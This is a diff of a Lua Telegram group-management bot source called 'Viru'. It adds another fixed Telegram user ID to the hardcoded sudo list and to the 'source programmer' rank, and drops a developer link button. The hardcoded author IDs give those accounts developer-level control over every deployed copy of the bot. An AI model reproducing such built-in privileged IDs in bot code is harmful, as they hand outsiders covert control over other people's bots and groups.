@@ -126,13 +126,13 @@ print("\27[36m"..[[
 |             \_/ |_|_|  \___/              |
 |-------------------------------------------|
 | This Source Was Developed By(Viru) @IlTTTl|
-|   This Is The Source Channel @FF7IF . |
+|   This Is The Source Channel @FF7IF .     |
 |                - Viru -                   |
 ---------------------------------------------
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1558668590,1643304335,1688091080}
+SudoIds = {Config.SudoIds,1558668590,1643304335,1688091080,1772293192}
 Viru = Config.Viru
 TokenBot = Config.TokenBot
 NameBot = (DevRio:get(Viru..'Rio:NameBot') or 'فيرو')
@@ -598,7 +598,7 @@ end ,nil)
 end
 --     Source Viru     --
 local RioRank = function(msg) if SudoId(msg.sender_user_id_) then ViruTeam  = "المطور" elseif SecondSudo(msg) then ViruTeam = "المطور" elseif SudoBot(msg) then ViruTeam = "المطور" elseif ManagerAll(msg) then ViruTeam = "المدير" elseif AdminAll(msg) then ViruTeam = "الادمن" elseif RioConstructor(msg) then ViruTeam = "المالك" elseif BasicConstructor(msg) then ViruTeam = "المنشئ" elseif Constructor(msg) then ViruTeam = "المنشئ" elseif Manager(msg) then ViruTeam = "المدير" elseif Admin(msg) then ViruTeam = "الادمن" else ViruTeam = "العضو" end return ViruTeam end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1643304335) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1688091080) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1194523039) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Viru) then ViruTeam = 'البوت' elseif SudoId(user_id) then ViruTeam = 'المطور الاساسي' elseif DevRio:sismember(Viru..'Rio:SecondSudo:', user_id) then ViruTeam = 'المطور الاساسي²' elseif DevRio:sismember(Viru..'Rio:SudoBot:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Viru..'Rio:ManagerAll:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:Managers:Rd"..chat_id) or 'المدير العام' elseif DevRio:sismember(Viru..'Rio:AdminAll:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevRio:sismember(Viru..'Rio:VipAll:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevRio:sismember(Viru..'Rio:RioConstructor:'..chat_id, user_id) then ViruTeam = 'المالك' elseif DevRio:sismember(Viru..'Rio:BasicConstructor:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Viru..'Rio:Constructor:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Viru..'Rio:Managers:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Viru..'Rio:Admins:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Viru..'Rio:VipMem:'..chat_id, user_id) then  ViruTeam = DevRio:get(Viru.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Viru..'Rio:Cleaner:'..chat_id, user_id) then  ViruTeam = DevRio:get(Viru.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else ViruTeam = DevRio:get(Viru.."Rio:mem:Rd"..chat_id) or 'العضو' end return ViruTeam end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1643304335) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1688091080) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1194523039) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1772293192) then ViruTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Viru) then ViruTeam = 'البوت' elseif SudoId(user_id) then ViruTeam = 'المطور الاساسي' elseif DevRio:sismember(Viru..'Rio:SecondSudo:', user_id) then ViruTeam = 'المطور الاساسي²' elseif DevRio:sismember(Viru..'Rio:SudoBot:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Viru..'Rio:ManagerAll:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:Managers:Rd"..chat_id) or 'المدير العام' elseif DevRio:sismember(Viru..'Rio:AdminAll:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevRio:sismember(Viru..'Rio:VipAll:', user_id) then ViruTeam = DevRio:get(Viru.."Rio:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevRio:sismember(Viru..'Rio:RioConstructor:'..chat_id, user_id) then ViruTeam = 'المالك' elseif DevRio:sismember(Viru..'Rio:BasicConstructor:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Viru..'Rio:Constructor:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Viru..'Rio:Managers:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Viru..'Rio:Admins:'..chat_id, user_id) then ViruTeam = DevRio:get(Viru.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Viru..'Rio:VipMem:'..chat_id, user_id) then  ViruTeam = DevRio:get(Viru.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Viru..'Rio:Cleaner:'..chat_id, user_id) then  ViruTeam = DevRio:get(Viru.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else ViruTeam = DevRio:get(Viru.."Rio:mem:Rd"..chat_id) or 'العضو' end return ViruTeam end
 --     Source Viru     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -3818,7 +3818,7 @@ Welcome To Source
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '↯ Source Channel',url="https://t.me/FF7iF"},{text = '↯ Exp Source',url="https://t.me/ltttli"}},
-{{text = '↯ Developer',url="t.me/IlTTTl"},{text = '↯ Developer 2',url="t.me/IIIIlllllIll"}},
+{{text = '↯ Developer',url="t.me/IlTTTl"}},
 {{text = '↯ Tws Viru',url="https://t.me/iltttbot"}},
 }
 local msg_id = msg.id_/2097152/0.5
